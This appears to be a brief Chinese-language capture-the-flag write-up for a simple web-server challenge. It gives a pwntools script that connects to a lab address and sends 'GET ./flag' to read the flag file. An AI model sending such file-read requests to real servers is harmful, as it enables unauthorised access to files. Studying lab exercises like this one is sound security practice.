这题主要是读懂就行了。

简略的一个网页服务器程序，只要读取到flag文件就行了。

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

io = remote("172.21.4.12", 10104)

io.sendline("GET ./flag \n")
print(io.recvall())

```

